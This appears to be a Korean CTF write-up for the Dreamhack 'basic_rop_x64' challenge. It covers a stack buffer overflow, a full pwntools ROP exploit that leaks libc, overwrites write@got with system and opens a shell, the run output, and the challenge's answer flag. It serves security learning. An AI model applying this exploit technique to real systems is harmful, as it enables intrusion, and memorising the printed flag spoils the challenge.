### 문제 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

`read` 함수와 `write` 함수를 이용해서 ROP를 하는 문제인 거 같습니다.

<br>

### 보호 기법

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

NX 보호기법이 걸려있습니다.

<br>


### 스택 구조

```bash
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]	// rax = buf
   0x00000000004007eb <+49>:    mov    edx,0x400	// edx = 0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax	// rsi = buf
   0x00000000004007f3 <+57>:    mov    edi,0x0	// edi = 0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>	// read(0, buf, 0x400)
```

<img src="https://velog.velcdn.com/images/silvergun8291/post/9867a28b-c397-4bcd-9de6-8711969d167c/image.png">


<br>

### ROP 공격 단계

```bash
1. 필요한 정보 구하기
2. read 함수의 실제 주소 leak
3. ASLR 우회를 위해 BSS 영역에 "/bin/sh" 저장
4. write@got를 system 실제 주소로 got overwrite
5. "/bin/sh" 인자로 write() 호출 -> system("/bin/sh")가 호출 됨
```

<br>

### 익스플로잇

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = remote("host2.dreamhack.games", 23503)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
r = ROP(e)


# [1] 필요한 정보 수집
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
bss = e.bss()

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

payload = b'A'*72



# [2] wrtie(1, read@got, 16) => read() 실제 주소 흭득
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(16)
payload += p64(write_plt)


# [3] read(0, bss, 8) => BSS 영역에 "/bin/sh" 쓰기
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(8)
payload += p64(read_plt)


# [4] read(0, write@got, 16) => write@got를 system로 got overwrite
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(write_got) + p64(16)
payload += p64(read_plt)


# [5] write("/bin/sh") => system("/bin/sh")가 호출 됨
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(write_plt)



# [6] payload, data 전송
p.send(payload)

p.recvuntil(b'A' * 64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b"/bin/sh\x00")
p.send(p64(system))
p.interactive()
```

<br>

익스플로잇 코드를 실행시켜보면

```bash
$ python3 exploit.py
[+] Opening connection to host2.dreamhack.games on port 23503: Done
[*] '/home/ion/wargame/basic_rop_x64/basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/ion/wargame/basic_rop_x64/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './basic_rop_x64'
[+] libc base: 0x7fb5e8f61000
[+] read: 0x7fb5e9058250
[+] system: 0x7fb5e8fa6390
[*] Switching to interactive mode
\x00@\x17\xe8\xb5\x00\xc0c\xf9\xe8\xb5\x00\x0e\xe8\xb5\x006\x06\x00\x00\x00\x00\x00\x00\x00\x00\
$
```

공격에 성공해서 쉘이 떴습니다.

<br>

flag 파일을 출력해보면

```bash
$ ls
basic_rop_x64
flag
$ cat flag
DH{357ad9f7c0c54cf85b49dd6b7765fe54}
```
